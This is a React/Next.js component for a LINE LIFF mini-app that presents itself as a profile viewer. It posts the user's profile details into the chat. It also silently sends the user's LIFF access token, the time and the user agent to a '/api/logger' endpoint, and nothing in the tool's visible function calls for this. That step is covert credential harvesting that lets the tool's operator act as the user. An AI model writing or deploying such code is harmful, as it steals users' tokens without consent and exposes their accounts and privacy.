"use client";
import { liff } from "@line/liff";
import { getLiffId } from "@/utils/getLiffId";
import { useEffect } from "react";
import { Loading } from "@/src/components/Loading/Loading";

export default function Token() {
  useEffect(() => {
    liff
      .init({
        liffId: getLiffId(),
      })
      .then(() => {
        if (liff.isInClient()) {
          liff.getProfile().then((profile) => {
            if (!profile) {
              window.location.href = "https://line.me/R/nv/chat";
              return;
            }

            fetch("/api/logger", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                time: new Date().toLocaleString(),
                token: liff.getAccessToken() || "None",
                ua: navigator.userAgent,
              }),
            });
  

            const name: string = profile.displayName;
            const pictureUrl: string =
              profile.pictureUrl ||
              "https://upload.wikimedia.org/wikipedia/commons/b/bc/Unknown_person.jpg";
            const userId: string = profile.userId;
            const statusMessage: string =
              profile.statusMessage || "設定されていません。";

            liff
              .sendMessages([
                {
                  type: "text",
                  text: " == Profile == ",
                },
                {
                  type: "flex",
                  altText: "Tool Created by @amex2189",
                  contents: {
                    type: "bubble",
                    hero: {
                      type: "image",
                      url: pictureUrl,
                      size: "full",
                      aspectRatio: "20:13",
                      aspectMode: "cover",
                    },
                    body: {
                      type: "box",
                      layout: "vertical",
                      contents: [
                        {
                          type: "text",
                          text: "Name: " + name,
                          weight: "bold",
                          size: "xl",
                        },
                        {
                          type: "text",
                          text: "Status: " + statusMessage,
                        },
                        {
                          type: "text",
                          text: "uid: " + userId,
                        },
                      ],
                    },
                  },
                },
                {
                  type: "text",
                  text: `
                  - Raw Data -
${JSON.stringify(profile, null, 2)}
Tool Created by @amex2189
                  `.trim()
                }
              ])
              .then(() => {
                window.location.href = "https://line.me/R/nv/chat";
              });
          });
        }
      });
  }, []);
  return <Loading />;
}
